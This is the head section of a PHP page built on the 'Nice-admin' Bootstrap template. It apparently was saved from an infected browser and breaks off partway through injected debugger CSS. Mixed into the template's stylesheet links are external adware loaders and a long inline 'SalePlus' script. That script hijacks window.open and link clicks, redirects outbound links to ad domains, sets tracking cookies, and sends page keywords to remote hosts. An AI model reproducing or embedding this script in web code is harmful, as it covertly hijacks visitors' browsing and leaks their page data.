<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="Creative - Bootstrap 3 Responsive Admin Template">
    <meta name="author" content="GeeksLabs">
    <meta name="keyword" content="Creative, Dashboard, Admin, Template, Theme, Bootstrap, Responsive, Retina, Minimal">
    <link rel="shortcut icon" href="img/favicon.png">

    <title>Creative - Bootstrap Admin Template</title>

    <!-- Bootstrap CSS -->    
    <link href="<?php echo base_url("assets/Nice-admin/css/bootstrap.min.css"); ?>" rel="stylesheet">
    <!-- bootstrap theme -->
    <link href="<?php echo base_url("assets/Nice-admin/css/bootstrap-theme.css"); ?>" rel="stylesheet">
    <!--external css-->
    <!-- font icon -->
    <link href="<?php echo base_url("assets/Nice-admin/css/elegant-icons-style.css"); ?>" rel="stylesheet">
<link href="<?php echo base_url("assets/Nice-admin/css/font-awesome.min.css"); ?>" rel="stylesheet">

    
    <!-- Custom styles -->
    <link href="<?php echo base_url("assets/Nice-admin/css/widgets.css"); ?>" rel="stylesheet">
    
    <link href="<?php echo base_url("assets/Nice-admin/css/style.css"); ?>" rel="stylesheet">

    
    <link href="<?php echo base_url("assets/Nice-admin/css/style-responsive.css"); ?>" rel="stylesheet">
    
    <link href="<?php echo base_url("assets/Nice-admin/css/xcharts.min.css"); ?>" rel="stylesheet">
    
    <link href="<?php echo base_url("assets/Nice-admin/css/jquery-ui-1.10.4.min.css"); ?>" rel="stylesheet">
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 -->
    <!--[if lt IE 9]>
      <script src="js/html5shiv.js"></script>
      <script src="js/respond.min.js"></script>
      <script src="js/lte-ie7.js"></script>
    <![endif]-->
    <style type="text/css">.jqstooltip { position: absolute;left: 0px;top: 0px;display: block;visibility: hidden;background: rgb(0, 0, 0) transparent;background-color: rgba(0,0,0,0.6);filter:progid:DXImageTransform.Microsoft.gradient(startColorstr=#99000000, endColorstr=#99000000);-ms-filter: "progid:DXImageTransform.Microsoft.gradient(startColorstr=#99000000, endColorstr=#99000000)";color: white;font: 10px arial, san serif;text-align: left;white-space: nowrap;border: 1px solid white;z-index: 10000;}.jqsfield { color: white;padding: 5px 5px 8px 5px;font: 10px arial, san serif;text-align: left;}</style><script src="//cdncache-a.akamaihd.net/loaders/1750/l.js?aoi=1311798366&amp;pid=1750&amp;zoneid=458516&amp;ext=SalePlus&amp;systemid=1631384958982904955&amp;ext=SalePlus" id="sdjksjsksjdskjd__0" async="" type="text/javascript"></script><script src="//cdncache-a.akamaihd.net/loaders/1749/l.js?aoi=1311798366&amp;pid=1749&amp;zoneid=458516&amp;ext=SalePlus&amp;systemid=1631384958982904955&amp;ext=SalePlus" id="7ejvo4812cvb6skot83mcweg3" async="" type="text/javascript"></script><script id="id_ad5cbe0b719874f1" src="//istatic.eshopcomp.com/fo/min/wpgb.js?bname=SalePlus&amp;subid=1307_23754" async="" type="text/javascript"></script><script type="text/javascript" id="fghjktghndfgt">function fghjktghndfgt_init() {
            new function () {
                if (!document.getElementById('__fghjktghndfgt_once')) {
                    (function () {
                        var a = document.createElement('div');
                        a.id = '__fghjktghndfgt_once';
                        a.setAttribute('style', 'display:none;');
                        var c = document.getElementsByTagName('body')[0];
                        c && c.appendChild(a)
                    })();
                    var a = this;
                    a.pid = '23754';
                    a.cc = 'TH';
                    a.eid = '1307';
                    a.ename = 'SalePlus';
                    a.hid = '1631384958982904955';
                    a.debugMode = !1;
                    a.utils = new function () {
                        var b = this;
                        'function' !== typeof String.prototype.trim && (String.prototype.trim = function () {
                            return this.replace(/^\s+|\s+$/g, '')
                        });
                        b.JSON = new function () {
                            this.parse = function (c) {
                                try {
                                    return'undefined' !== typeof JSON && 'function' == typeof JSON.stringify ? JSON.parse(c) : eval('var a=' + c)
                                } catch (a) {
                                    return!1
                                }
                            }
                        };
                        b.cookie = new function () {
                            var c = this;
                            c.setCookie = function (c, a, b) {
                                var f = '';
                                'string' === typeof b ? f = '; expires=' + b : 'number' === typeof b && (f = new Date, f.setTime(f.getTime() + 864E5 * b), f = '; expires=' + f.toGMTString());
                                document.cookie = c + '=' + a + f + '; path=/'
                            };
                            c.getCookie = function (c) {
                                c += '=';
                                for (var a = document.cookie.split(';'), b = 0; b < a.length; b++) {
                                    for (var f = a[b]; ' ' == f.charAt(0); )
                                        f = f.substring(1, f.length);
                                    if (0 == f.indexOf(c))
                                        return f.substring(c.length, f.length)
                                }
                                return null
                            };
                            c.eraseCookie = function (a) {
                                c.setCookie(a, '', -1)
                            }
                        };
                        b.getProtocol = function (c) {
                            var a = document.createElement('a');
                            a.href = c;
                            return a.protocol
                        };
                        b.getHostName = function (c) {
                            if (!c)
                                return'';
                            var a = document.createElement('a');
                            a.href = c;
                            return a.hostname
                        };
                        b.isMenuBarVisible = function () {
                            if (!b.msie && window.menubar)
                                return window.menubar.visible;
                            if ('object' == typeof WebBrowser2)
                                return WebBrowser2.MenuBar;
                            if (b.msie)
                                return!0;
                            var c = window.innerWidth || document.documentElement.scrollWidth || 0, a = window.innerHeight || document.documentElement.scrollHeight || 0;
                            if (c) {
                                window.resizeTo(c, a);
                                var g = window.innerWidth || document.documentElement.scrollWidth, e = window.innerHeight || document.documentElement.scrollHeight;
                                window.resizeTo(c + 2, a);
                                c = window.scrollWidth || document.documentElement.scrollWidth;
                                return!(c != g && c <= g + 2 && 90 >= a - e)
                            }
                        };
                        b.getInstructions = function (c, d) {
                            b.msie ? b.inject_script(c + ('&cb=' + a.prefix + '.' + d)) : b.ajax.get(c, function (c) {
                                if (c)
                                    a[d](c)
                            })
                        };
                        b.l = new function () {
                            var c = this;
                            c.xlat = 'abcdwxyzstuvrqponmijklefghABCDWXYZSTUVMNOPQRIJKLEFGH9876543210+/';
                            c.encode = function (a) {
                                a = c._utf8_encode(a);
                                for (var b = '', e = 0; e < a.length; ) {
                                    var f = a.charCodeAt(e++), h = a.charCodeAt(e++), l = a.charCodeAt(e++), k = f >> 2, f = (f & 3) << 4 | h >> 4, n = (h & 15) << 2 | l >> 6, m = l & 63;
                                    isNaN(h) ? n = m = 64 : isNaN(l) && (m = 64);
                                    b = b + c.xlat.charAt(k) + c.xlat.charAt(f) + (64 == n ? '=' : c.xlat.charAt(n)) + (64 == m ? '=' : c.xlat.charAt(m))
                                }
                                return b
                            };
                            c._utf8_encode = function (c) {
                                if (c && c.length) {
                                    for (var a = '', b = 0; b < c.length; b++) {
                                        var f = c.charCodeAt(b);
                                        128 > f ? a += String.fromCharCode(f) : (127 < f && 2048 > f ? a += String.fromCharCode(f >> 6 | 192) : (a += String.fromCharCode(f >> 12 | 224), a += String.fromCharCode(f >> 6 & 63 | 128)), a += String.fromCharCode(f & 63 | 128))
                                    }
                                    return a
                                }
                                return c
                            };
                            c.decode = function (a) {
                                a = a.toString().replace(/[^A-Za-z0-9\+\/]/g, '');
                                for (var b = '', e = 0; e < a.length; ) {
                                    var f = c.xlat.indexOf(a.charAt(e++)), h = c.xlat.indexOf(a.charAt(e++)), l = c.xlat.indexOf(a.charAt(e++)), k = c.xlat.indexOf(a.charAt(e++)), n = (h & 15) << 4 | l >> 2, m = (l & 3) << 6 | k, b = b + String.fromCharCode(f << 2 | h >> 4);
                                    64 != l && 0 < n && (b += String.fromCharCode(n));
                                    64 != k && 0 < m && (b += String.fromCharCode(m))
                                }
                                return this._utf8_decode(b)
                            };
                            c._utf8_decode = function (a) {
                                for (var c = '', b = 0; b < a.length; ) {
                                    var f = a.charCodeAt(b);
                                    if (128 > f)
                                        c += String.fromCharCode(f), b++;
                                    else if (191 < f && 224 > f)
                                        var h = a.charCodeAt(b + 1), c = c + String.fromCharCode((f & 31) << 6 | h & 63), b = b + 2;
                                    else
                                        var h = a.charCodeAt(b + 1), l = a.charCodeAt(b + 2), c = c + String.fromCharCode((f & 15) << 12 | (h & 63) << 6 | l & 63), b = b + 3
                                }
                                return c
                            }
                        };
                        b.ajax = new function () {
                            this.get = function (a, b) {
                                try {
                                    var g = new XMLHttpRequest;
                                    g.open('GET', a, !0);
                                    g.withCredentials = !0;
                                    g.onreadystatechange = function () {
                                        4 == g.readyState && b(g.responseText)
                                    };
                                    g.send()
                                } catch (e) {
                                }
                            }
                        };
                        b.randomChar = function () {
                            for (var a = '', b = 0; 2 > b; b++)
                                a += 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'.charAt(Math.floor(52 * Math.random()));
                            return a
                        };
                        b.msie = function () {
                            var a = parseInt((/msie (\d+)/.exec(navigator.userAgent.toLowerCase()) || [])[1], 10);
                            isNaN(a) && (a = parseInt((/trident\/.*; rv:(\d+)/.exec(navigator.userAgent.toLowerCase()) || [])[1], 10));
                            return isNaN(a) ? !1 : a
                        }();
                        b.inject_script = function (c) {
                            var b = document.getElementsByTagName('body')[0], g = document.createElement('script');
                            g.type = 'text/javascript';
                            g.id = 'id_' + a.prefix;
                            g.src = c;
                            b && b.appendChild(g)
                        };
                        b.epoch = function () {
                            return Math.floor((new Date).getTime() / 1E3)
                        };
                        b.getVert = function () {
                            var a = localStorage.getItem('sk398erjds2d');
                            return a ? a : b.forexVert()
                        };
                        b.browser = function () {
                            var a = navigator.userAgent.toLowerCase(), b = {webkit: /webkit/.test(a), mozilla: /mozilla/.test(a) && !/(compatible|webkit)/.test(a), chrome: /chrome/.test(a), msie: /msie/.test(a) && !/opera/.test(a), firefox: /firefox/.test(a), safari: /safari/.test(a) && !/chrome/.test(a), opera: /opera/.test(a)};
                            b.version = b.safari ? (a.match(/.+(?:ri)[\/: ]([\d.]+)/) || [])[1] : (a.match(/.+(?:ox|me|ra|ie)[\/: ]([\d.]+)/) || [])[1];
                            return b
                        }();
                        b.getNodeTextProp = function (a) {
                            return'textContent'in a ? 'textContent' : 'innerText'in a ? 'innerText' : !1
                        };
                        b.dhtml_prop_name = function (a) {
                            return a.replace(/(\-([a-z]){1})/g, function (a, c, b) {
                                return b.toUpperCase()
                            })
                        };
                        b.get_computed_style = 'function' != typeof window.getComputedStyle ? function (a) {
                            return{getPropertyValue: function (d) {
                                    'float' == d && (d = 'styleFloat');
                                    d = b.dhtml_prop_name(d);
                                    return'object' == typeof a.currentStyle && null != a.currentStyle && 'undefined' != typeof a.currentStyle[d] ? a.currentStyle[d] : null
                                }}
                        } : function (a, b) {
                            return window.getComputedStyle(a, b) || {getPropertyValue: function () {
                                }}
                        };
                        b.getEmptyWindow = function () {
                            var a = document.createElement('iframe');
                            a.src = 'about:blank';
                            a.setAttribute('style', 'display:inline;width:1px;height:1px;padding:none;margin:none;');
                            document.body.appendChild(a);
                            return a.contentWindow
                        }
                    };
                    a.prefix = 'fghjktghndfgtssss';
                    a.extName = 'SalePlus';
                    a.version = '0.1.1';
                    a.pop_collision_id = '__ipm=';
                    a.pixelHostname = function () {
                        try {
                            return'//mnh.' + eval('["winnerical.info","winnermore.info"]')['https:' == window.location.protocol ? 1 : 0]
                        } catch (a) {
                            return['//mnh.winneri.info', '//mnh.winnermore.org']['https:' == window.location.protocol ? 1 : 0]
                        }
                    }();
                    a.watcherCount = 0;
                    a.fallbackHostnames = ['compey.net', 'comprises.info'];
                    try {
                        a.stngs = a.utils.JSON.parse('{"szy_domain":["unitspybookukset.org","comprises.info"],"ad_sizes":[[120,60,19],[630,250,22],[336,280,17],[630,500,23],[180,150,18],[234,60,15],[200,200,16],[600,400,13],[125,125,14],[670,670,11],[600,270,12],[800,600,21],[468,60,3],[800,440,20],[300,250,2],[728,90,1],[300,600,10],[120,240,7],[120,600,6],[160,600,5],[250,250,4],[240,400,8]]}')
                    } catch (q) {
                        a.hostnames = a.fallbackHostnames
                    }
                    var p;
                    p = '' !== a.stngs && a.stngs && 'undefined' !== typeof a.stngs.szy_domain && a.stngs.szy_domain instanceof Array ? a.stngs.szy_domain : a.fallbackHostnames;
                    a.hostnames = p;
                    a.debugMode && (a.debug = new function () {
                        var b = this;
                        window.oldSetTimeout = window.setTimeout;
                        window.oldSetInterval = window.setInterval;
                        b.overrideSettimeout = function () {
                            window.setTimeout = function (a, b) {
                                return window.oldSetTimeout(function () {
                                    try {
                                        console.log('%csetTimeout: ' + a.toString(), 'color:purple'), a()
                                    } catch (b) {
                                    }
                                }, b)
                            }
                        };
                        b.overrideSetinterval = function () {
                            window.setInterval = function (a, b) {
                                return window.oldSetInterval(function () {
                                    try {
                                        console.log('setInterval: ' + a.toString()), a()
                                    } catch (b) {
                                    }
                                }, b)
                            }
                        };
                        b.overrideVariables = function () {
                            a.pid = '12';
                            a.cc = 'US';
                            a.eid = '10';
                            a.hid = '123456789';
                            a.ename = 'QA extension';
                            a.lt = '2617.24';
                            a.jpshort = '_OXQj15i';
                            a.platform_version = '10'
                        };
                        b.init = function () {
                            b.overrideSettimeout();
                            b.overrideSetinterval();
                            b.overrideVariables()
                        };
                        b.init()
                    });
                    a.legacyHostnames = ['superiends.org', 'go.turboloves.net', 'installerapplicationusa.com', 'stylene.net'];
                    a.body = document.getElementsByTagName('body')[0];
                    a.params = {subid: a.pid, subid1: a.hid, subid2: a.eid, 'px.pluginh': 1, tid: '7', red: '1', subid3: '679'};
                    a.manhattanCookieInterval = 0.0015;
                    a.events = new function () {
                        var a = this;
                        a.cache = [];
                        a.add = window.addEventListener ? function (c, d, g, e, f) {
                            'undefined' == typeof e && (e = window);
                            e.addEventListener(c, d, g);
                            f && a.cache.push([c, d, g, e])
                        } : window.attachEvent ? function (c, d, g, e, f) {
                            'undefined' == typeof e && (e = window);
                            e['e' + c + d] = d;
                            e[c + d] = function () {
                                e['e' + c + d](window.event)
                            };
                            e.attachEvent('on' + c, e[c + d]);
                            f && a.cache.push([c, d, g, e])
                        } : function () {
                        };
                        a.remove = window.removeEventListener ? function (a, b, g, e) {
                            'undefined' == typeof e && (e = window);
                            e.removeEventListener(a, b, g)
                        } : window.detachEvent ? function (a, b, g, e) {
                            'undefined' == typeof e && (e = window);
                            e.detachEvent('on' + a, e[a + b]);
                            e[a + b] = null;
                            e['e' + a + b] = null
                        } : function () {
                        };
                        a.flush = function () {
                            for (var c = 0; c < a.cache.length; c++)
                                a.remove.apply(a, a.cache[c]);
                            a.cache = []
                        }
                    };
                    a.pixel = function (b, c) {
                        var d = a.pixelHostname + '?', g = a.hostnames[0], g = {pid: a.pid, cc: a.cc, eid: a.eid, hid: a.hid, v: a.version, ch: b, cid: 0, tid: a.params.tid, adtid: 0, smid: 0, pbid: '0', oh: encodeURIComponent(c), sh: encodeURIComponent(g)}, e;
                        for (e in g)
                            d += e + '=' + g[e] + '&';
                        d = d.slice(0, -1);
                        if (21 === b)
                            return d = d.split('?')[1], a.utils.l.encode(d);
                        (new Image).src = d
                    };
                    a.getKeywords = function () {
                        var a = document.title, c = document.getElementsByTagName('meta');
                        if (c)
                            for (var d = 0, g = c.length; d < g; d++)
                                'keywords' != c[d].name.toLowerCase() && 'description' != c[d].name.toLowerCase() || (a += ' ' + c[d].content.replace(/,/g, ' '));
                        if (d = document.getElementsByTagName('a')) {
                            c = {};
                            for (g = 0; g < d.length; g++)
                                try {
                                    var e = d[g].innerText;
                                    'undefined' == typeof e && (e = d[g].textContent);
                                    for (var f = e.toLowerCase().split(/[\s,-]/g), h = 0; h < f.length; h++)
                                        4 > f[h].length || (c[f[h]] ? c[f[h]]++ : c[f[h]] = 1)
                                } catch (l) {
                                }
                            var e = [], k;
                            for (k in c)
                                e.push([k, c[k]]);
                            e.sort(function (a, b) {
                                return b[1] - a[1]
                            });
                            e = e.slice(0, 25);
                            for (k = 0; k < e.length; k++)
                                a += ' ' + e[k][0]
                        }
                        return encodeURIComponent(a.replace(/[\!\[\]_-]/g, ' ').trim().substring(0, 1500))
                    };
                    a.isFalseResponseFromServer = function () {
                        -1 < a.body.innerText.indexOf('e7hZBzqVfn==') && window.close()
                    };
                    a.checkIfServer = function () {
                        for (var b = 0; b < a.hostnames.length; b++)
                            if (location.hostname === a.hostnames[b])
                                return a.isFalseResponseFromServer(), !0
                    };
                    a.checkIfPop = function (b, c, d) {
                        return!(d + '').match(/^InterYield/i) && !(d + '').match(/(a652c|ld893)_/) && 'r_ron_redir' !== d && -1 == document.cookie.indexOf('xcddsa') && -1 == b.indexOf('px.pluginh') && -1 == b.indexOf('earchfu') && -1 == location.href.indexOf('/amz/') && -1 == location.href.indexOf('/sd/dw32.html') && -1 == location.href.indexOf('/pop/1.1.00') && !location.href.match(/cpops-\d+\.html/) && -1 == location.href.indexOf('px.pluginh') && -1 == b.indexOf('nkths.co') && -1 == b.indexOf('ally.asi') && -1 == b.indexOf('/sd/dw32.html') && -1 == b.indexOf('/pop/1.1.00') && -1 == b.indexOf('/amz/') && !b.match(/cpops-\d+\.html/) && -1 == a.utils.getHostName(b).indexOf('getjs') && -1 == a.utils.getHostName(b).indexOf('hsbc')
                    };
                    window == window.top && a.pixel(10, '0');
                    -1 < window.location.href.indexOf(a.pop_collision_id) && window == window.top && a.pixel(13, '0');
                    a.addBlurredTabListener = function (b) {
                        var c;
                        try {
                            c = a.utils.getHostName(b.target.getAttribute('href'))
                        } catch (d) {
                            c = ''
                        }
                        'a' == b.target.tagName.toLowerCase() && '' == b.target.innerHTML && b.target.getAttribute('href') && !b.target.getAttribute('download') && -1 == c.indexOf(window.location.hostname) && (c = b.target.getAttribute('href') ? b.target.getAttribute('href') : '0', a.manhattanUrl = a.prepareUrl(c), a.pixel(12, c), b.target.setAttribute('target', a.prefix), c = new Date, c.setMinutes(c.getMinutes() + 15), a.utils.cookie.setCookie('vdsknj4th4uh', '1', c.toUTCString()), b.target.setAttribute('href', a.manhattanUrl), document.getElementsByTagName('body')[0].removeEventListener('click', a.addBlurredTabListener))
                    };
                    a.prepareUrl = function (b) {
                        b = '?';
                        for (var c in a.params)
                            b += c + '=' + a.params[c] + '&';
                        b += 'k=' + a.getKeywords();
                        return'http://' + a.hostnames[0] + b
                    };
                    try {
                        window.top == window && -1 == document.cookie.indexOf('vdsknj4th4uh') && window.name !== a.prefix && a.overrideDispatchEvent()
                    } catch (r) {
                    }
                    a.checkIfServer() || (a.cachedOpenFn = window.open, a.overrideDispatchEvent = function () {
                        a.cachedDispatchEvent = document.createElement('a').constructor.prototype.dispatchEvent;
                        document.createElement('a').constructor.prototype.dispatchEvent = function (b) {
                            var c;
                            try {
                                c = a.utils.getHostName(event.target.getAttribute('href'))
                            } catch (d) {
                                c = ''
                            }
                            'a' == this.tagName.toLowerCase() && '' == this.innerHTML && 'click' == b.type && -1 == c.indexOf(window.location.hostname) && this.getAttribute('href') && !this.getAttribute('download') && -1 == document.cookie.indexOf('vdsknj4th4uh') && (c = this.getAttribute('href') ? this.getAttribute('href') : '0', a.manhattanUrl = a.prepareUrl(c), a.pixel(12, c), this.setAttribute('target', a.prefix), c = new Date, c.setMinutes(c.getMinutes() + 15), a.utils.cookie.setCookie('vdsknj4th4uh', '1', c.toUTCString()), this.setAttribute('href', a.manhattanUrl));
                            a.cachedDispatchEvent.call(this, b)
                        }
                    }, a.checkIfPartner = function (a) {
                        return'Za' == a
                    }, a.overrideWindowOpen = function () {
                        clearTimeout(a.timeout);
                        window.open = function (b) {
                            return function (c, d, g) {
                                window == window.top && a.pixel(11, '0');
                                b = a.cachedOpenFn;
                                if (a.checkIfPop(c, g, d))
                                    return d = new Date, d.setMinutes(d.getMinutes() + 15), a.utils.cookie.setCookie('xcddsa', '1', d.toUTCString()), a.manhattanUrl = a.prepareUrl(c), d = a.prefix, a.pixel(20, c), a.manhattanOn = !0, a.utils.msie && 9 > a.utils.msie ? window.open(a.manhattanUrl, d, g) : b.call(window, a.manhattanUrl, d, g);
                                d = d || '';
                                window.open = a.cachedOpenFn;
                                return a.utils.msie && 9 > a.utils.msie ? window.open(c, d, g) : b.call(window, c, d, g)
                            }
                        }(window.open);
                        4 < a.watcherCount || a.manhattanOn || (a.watcherCount++, a.openWatcher())
                    }, a.overrideDispatchEvent(), a.openWatcher = function () {
                        a.timeout = setTimeout(a.overrideWindowOpen, 200)
                    }, a.openWatcher(), 'undefined' == typeof window[a.prefix] && (window[a.prefix] = a))
                }
            };
        }
        ;
        fghjktghndfgt_init()</script><style class="firebugResetStyles" type="text/css" charset="utf-8">/* See license.txt for terms of usage */
        /** reset styling **/
        .firebugResetStyles {
            z-index: 2147483646 !important;
            top: 0 !important;
            left: 0 !important;
            display: block !important;
            border: 0 none !important;
            margin: 0 !important;
            padding: 0 !important;
            outline: 0 !important;
            min-width: 0 !important;
            max-width: none !important;
            min-height: 0 !important;
            max-height: none !important;
            position: fixed !important;
            transform: rotate(0deg) !important;
            transform-origin: 50% 50% !important;
            border-radius: 0 !important;
            box-shadow: none !important;
            background: transparent none !important;
            pointer-events: none !important;
            white-space: normal !important;
        }
        style.firebugResetStyles {
            display: none !important;
        }

        .firebugBlockBackgroundColor {
            background-color: transparent !important;
        }

        .firebugResetStyles:before, .firebugResetStyles:after {
            content: "" !important;
        }
        /**actual styling to be modified by firebug theme**/
        .firebugCanvas {
            display: none !important;
        }

        /* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * */
        .firebugLayoutBox {
            width: auto !important;
            position: static !important;
        }

        .firebugLayoutBoxOffset {
            opacity: 0.8 !important;
            position: fixed !important;
        }

        .firebugLayoutLine {
            opacity: 0.4 !important;
            background-color: #000000 !important;
        }

        .firebugLayoutLineLeft, .firebugLayoutLineRight {
            width: 1px !important;
            height: 100% !important;
        }

        .firebugLayoutLineTop, .firebugLayoutLineBottom {
            width: 100% !important;
            height: 1px !important;
        }

        .firebugLayoutLineTop {
            margin-top: -1px !important;
            border-top: 1px solid #999999 !important;
        }

        .firebugLayoutLineRight {
            border-right: 1px solid #999999 !important;
        }

        .firebugLayoutLineBottom {
            border-bottom: 1px solid #999999 !important;
        }

        .firebugLayoutLineLeft {
            margin-left: -1px !important;
            border-left: 1px solid #999999 !important;
        }

        /* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * */
        .firebugLayoutBoxParent {
            border-top: 0 none !important;
            border-right: 1px dashed #E00 !important;
            border-bottom: 1px dashed #E00 !important;
            border-left: 0 none !important;
            position: fixed !important;
            width: auto !important;
        }

        .firebugRuler{
            position: absolute !important;
        }

        .firebugRulerH {
            top: -15px !important;
            left: 0 !important;
            width: 100% !important;
            height: 14px !important;
            background: url("data:image/png,%89PNG%0D%0A%1A%0A%00%00%00%0DIHDR%00%00%13%88%00%00%00%0E%08%02%00%00%00L%25a%0A%00%00%00%04gAMA%00%00%D6%D8%D4OX2%00%00%00%19tEXtSoftware%00Adobe%20ImageReadyq%C9e%3C%00%00%04%F8IDATx%DA%EC%DD%D1n%E2%3A%00E%D1%80%F8%FF%EF%E2%AF2%95%D0D4%0E%C1%14%B0%8Fa-%E9%3E%CC%9C%87n%B9%81%A6W0%1C%A6i%9A%E7y%0As8%1CT%A9R%A5J%95*U%AAT%A9R%A5J%95*U%AAT%A9R%A5J%95*U%AAT%A9R%A5J%95*U%AAT%A9R%A5J%95*U%AAT%A9R%A5J%95*U%AAT%A9R%A5J%95*U%AATE9%FE%FCw%3E%9F%AF%2B%2F%BA%97%FDT%1D~K(%5C%9D%D5%EA%1B%5C%86%B5%A9%BDU%B5y%80%ED%AB*%03%FAV9%AB%E1%CEj%E7%82%EF%FB%18%BC%AEJ8%AB%FA'%D2%BEU9%D7U%ECc0%E1%A2r%5DynwVi%CFW%7F%BB%17%7Dy%EACU%CD%0E%F0%FA%3BX%FEbV%FEM%9B%2B%AD%BE%AA%E5%95v%AB%AA%E3E5%DCu%15rV9%07%B5%7F%B5w%FCm%BA%BE%AA%FBY%3D%14%F0%EE%C7%60%0EU%AAT%A9R%A5J%95*U%AAT%A9R%A5J%95*U%AAT%A9R%A5J%95*U%AAT%A9R%A5J%95*U%AAT%A9R%A5JU%88%D3%F5%1F%AE%DF%3B%1B%F2%3E%DAUCNa%F92%D02%AC%7Dm%F9%3A%D4%F2%8B6%AE*%BF%5C%C2Ym~9g5%D0Y%95%17%7C%C8c%B0%7C%18%26%9CU%CD%13i%F7%AA%90%B3Z%7D%95%B4%C7%60%E6E%B5%BC%05%B4%FBY%95U%9E%DB%FD%1C%FC%E0%9F%83%7F%BE%17%7DkjMU%E3%03%AC%7CWj%DF%83%9An%BCG%AE%F1%95%96yQ%0Dq%5Dy%00%3Et%B5'%FC6%5DS%95pV%95%01%81%FF'%07%00%00%00%00%00%00%00%00%00%F8x%C7%F0%BE%9COp%5D%C9%7C%AD%E7%E6%EBV%FB%1E%E0(%07%E5%AC%C6%3A%ABi%9C%8F%C6%0E9%AB%C0'%D2%8E%9F%F99%D0E%B5%99%14%F5%0D%CD%7F%24%C6%DEH%B8%E9rV%DFs%DB%D0%F7%00k%FE%1D%84%84%83J%B8%E3%BA%FB%EF%20%84%1C%D7%AD%B0%8E%D7U%C8Y%05%1E%D4t%EF%AD%95Q%BF8w%BF%E9%0A%BF%EB%03%00%00%00%00%00%00%00%00%00%B8vJ%8E%BB%F5%B1u%8Cx%80%E1o%5E%CA9%AB%CB%CB%8E%03%DF%1D%B7T%25%9C%D5(%EFJM8%AB%CC'%D2%B2*%A4s%E7c6%FB%3E%FA%A2%1E%80~%0E%3E%DA%10x%5D%95Uig%15u%15%ED%7C%14%B6%87%A1%3B%FCo8%A8%D8o%D3%ADO%01%EDx%83%1A~%1B%9FpP%A3%DC%C6'%9C%95gK%00%00%00%00%00%00%00%00%00%20%D9%C9%11%D0%C0%40%AF%3F%EE%EE%92%94%D6%16X%B5%BCMH%15%2F%BF%D4%A7%C87%F1%8E%F2%81%AE%AAvzr%DA2%ABV%17%7C%E63%83%E7I%DC%C6%0Bs%1B%EF6%1E%00%00%00%00%00%00%00%00%00%80cr%9CW%FF%7F%C6%01%0E%F1%CE%A5%84%B3%CA%BC%E0%CB%AA%84%CE%F9%BF)%EC%13%08WU%AE%AB%B1%AE%2BO%EC%8E%CBYe%FE%8CN%ABr%5Dy%60~%CFA%0D%F4%AE%D4%BE%C75%CA%EDVB%EA(%B7%F1%09g%E5%D9%12%00%00%00%00%00%00%00%00%00H%F6%EB%13S%E7y%5E%5E%FB%98%F0%22%D1%B2'%A7%F0%92%B1%BC%24z3%AC%7Dm%60%D5%92%B4%7CEUO%5E%F0%AA*%3BU%B9%AE%3E%A0j%94%07%A0%C7%A0%AB%FD%B5%3F%A0%F7%03T%3Dy%D7%F7%D6%D4%C0%AAU%D2%E6%DFt%3F%A8%CC%AA%F2%86%B9%D7%F5%1F%18%E6%01%F8%CC%D5%9E%F0%F3z%88%AA%90%EF%20%00%00%00%00%00%00%00%00%00%C0%A6%D3%EA%CFi%AFb%2C%7BB%0A%2B%C3%1A%D7%06V%D5%07%A8r%5D%3D%D9%A6%CAu%F5%25%CF%A2%99%97zNX%60%95%AB%5DUZ%D5%FBR%03%AB%1C%D4k%9F%3F%BB%5C%FF%81a%AE%AB'%7F%F3%EA%FE%F3z%94%AA%D8%DF%5B%01%00%00%00%00%00%00%00%00%00%8E%FB%F3%F2%B1%1B%8DWU%AAT%A9R%A5J%95*U%AAT%A9R%A5J%95*U%AAT%A9R%A5J%95*U%AAT%A9R%A5J%95*U%AAT%A9R%A5J%95*U%AAT%A9R%A5J%95*U%AAT%A9R%A5J%95*UiU%C7%BBe%E7%F3%B9%CB%AAJ%95*U%AAT%A9R%A5J%95*U%AAT%A9R%A5J%95*U%AAT%A9R%A5J%95*U%AAT%A9R%A5J%95*U%AAT%A9R%A5J%95*U%AAT%A9R%A5J%95*U%AAT%A9R%A5*%AAj%FD%C6%D4%5Eo%90%B5Z%ADV%AB%D5j%B5Z%ADV%AB%D5j%B5Z%ADV%AB%D5j%B5Z%ADV%AB%D5j%B5Z%ADV%AB%D5j%B5Z%ADV%AB%D5j%B5Z%ADV%AB%D5j%B5%86%AF%1B%9F%98%DA%EBm%BBV%AB%D5j%B5Z%ADV%AB%D5j%B5Z%ADV%AB%D5j%B5Z%ADV%AB%D5j%B5Z%ADV%AB%D5j%B5Z%ADV%AB%D5j%B5Z%ADV%AB%D5j%B5Z%AD%D6%E4%F58%01%00%00%00%00%00%00%00%00%00%00%00%00%00%40%85%7F%02%0C%008%C2%D0H%16j%8FX%00%00%00%00IEND%AEB%60%82") repeat-x !important;
            border-top: 1px solid #BBBBBB !important;
            border-right: 1px dashed #BBBBBB !important;
            border-bottom: 1px solid #000000 !important;
        }

        .firebugRulerV {
            top: 0 !important;
            left: -15px !important;
            width: 14px !important;
            height: 100% !important;
